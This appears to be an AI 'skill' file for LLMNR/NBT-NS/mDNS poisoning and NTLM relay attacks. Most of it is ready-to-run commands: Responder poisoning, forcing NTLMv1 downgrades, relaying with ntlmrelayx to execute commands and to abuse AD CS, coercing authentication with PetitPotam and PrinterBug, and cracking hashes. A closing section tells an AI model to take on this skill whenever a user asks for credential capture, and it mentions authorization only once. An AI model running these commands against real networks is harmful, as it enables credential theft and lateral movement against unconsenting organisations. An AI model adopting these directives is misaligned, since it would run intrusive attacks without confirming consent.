# LLMNR/NBT-NS/mDNS Poisoning and Relay Attacks Skill

## Goal

Exploit local network name resolution protocols (LLMNR, NBT-NS, mDNS) to capture credentials and perform relay attacks for lateral movement and privilege escalation.

## Methodology

1. **Protocol Poisoning**: Respond to multicast/broadcast name resolution requests with attacker IP
2. **Credential Capture**: Capture NTLMv1/v2 hashes when victims authenticate to spoofed services
3. **WPAD Exploitation**: Hijack Web Proxy Auto-Discovery to redirect traffic
4. **Relay Attacks**: Forward captured authentication to other services (SMB, LDAP, HTTP)
5. **Hash Cracking**: Attempt to crack captured hashes offline

## Background

### Vulnerable Protocols
- **LLMNR (Link-Local Multicast Name Resolution)**: UDP 5355, used when DNS fails
- **NBT-NS (NetBIOS Name Service)**: UDP 137, legacy Windows name resolution
- **mDNS (Multicast DNS)**: UDP 5353, used by Apple/Linux systems
- **WPAD (Web Proxy Auto-Discovery)**: Automatic proxy configuration

These protocols are vulnerable because:
- They broadcast/multicast queries on the local network
- They have no authentication mechanism
- Any host can respond to queries

## Tools

* **Responder**: Multi-protocol poisoner and credential capturer
* **Dementor**: Advanced multicast poisoner with rogue service support
* **Inveigh**: PowerShell-based LLMNR/NBT-NS poisoner for Windows
* **ntlmrelayx**: NTLM relay attack tool from Impacket
* **MultiRelay**: Relay attacks to multiple targets
* **hashcat/john**: Hash cracking tools

## Example Commands

```bash
# Basic Responder attack
responder -I eth0

# Aggressive mode with analysis
responder -I eth0 -P -r -v

# Enable WPAD poisoning
responder -I eth0 --wpad

# Capture NTLMv1 (easier to crack)
responder -I eth0 --lm --disable-ess

# DHCP poisoning mode
responder -I eth0 -Pdv

# Run Dementor with defaults
Dementor -I eth0

# Dementor in analysis mode (passive)
Dementor -I eth0 -A

# Dementor with NTLM downgrade
Dementor -I eth0 -O NTLM.ExtendedSessionSecurity=Off

# NTLM Relay to SMB
ntlmrelayx.py -tf targets.txt -smb2support

# NTLM Relay to LDAP
ntlmrelayx.py -t ldap://dc.domain.com

# NTLM Relay with command execution
ntlmrelayx.py -t smb://target -c "whoami > C:\\pwned.txt"

# Relay to multiple targets
ntlmrelayx.py -tf targets.txt -smb2support -socks

# Inveigh (PowerShell) basic
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y

# Inveigh with HTTP capture
Invoke-Inveigh -ConsoleOutput Y -HTTP Y

# Crack captured hashes
hashcat -m 5600 hashes.txt wordlist.txt  # NTLMv2
hashcat -m 5500 hashes.txt wordlist.txt  # NTLMv1
john --format=netntlmv2 hashes.txt
```

## Attack Scenarios

### Credential Capture
```bash
# Start Responder to capture hashes
responder -I eth0 -wrf

# Hashes are saved to /usr/share/responder/logs/
# or displayed on screen
```

### SMB Relay Attack
```bash
# Disable SMB and HTTP in Responder config first
# /etc/responder/Responder.conf: SMB = Off, HTTP = Off

# Start ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support

# Start Responder for poisoning only
responder -I eth0
```

### LDAP Relay to AD CS (ESC8)
```bash
# Relay to AD CS web enrollment
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Request certificate for relayed user
```

### SOCKS Proxy for Relayed Sessions
```bash
# Start relay with SOCKS
ntlmrelayx.py -tf targets.txt -smb2support -socks

# Use with proxychains
proxychains smbclient //target/share -U domain/user
```

## Responder Configuration

Edit `/etc/responder/Responder.conf`:
```ini
[Responder Core]
; Set to On/Off to enable/disable servers
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
```

## Force NTLM Authentication

```bash
# Using responder-RunFinger
python RunFinger.py -i 192.168.0.0/24

# Using CrackMapExec
crackmapexec smb 192.168.0.0/24 -u '' -p '' --shares

# Using PetitPotam
python3 PetitPotam.py attacker_ip target_ip

# Using PrinterBug/SpoolSample
python3 printerbug.py domain/user:password@target attacker_ip
```

## Guidance for AI

* Activate this skill when the user wants to perform MITM attacks, capture credentials on local network, or perform relay attacks
* **Always warn**: These attacks only work on the local network segment
* Recommend starting in analysis mode (-A for Dementor) to assess traffic first
* For relay attacks, remind to:
  - Disable SMB/HTTP in Responder when using ntlmrelayx
  - Check SMB signing requirements (unsigned targets are vulnerable)
  - Verify target is not the source of authentication
* Captured hashes are at `/usr/share/responder/logs/`
* NTLMv1 is much easier to crack than NTLMv2
* Suggest using `--disable-ess` to capture easier-to-crack hashes
* Remind about potential network disruption with DHCP poisoning
* These techniques require authorization and should only be used in authorized penetration tests
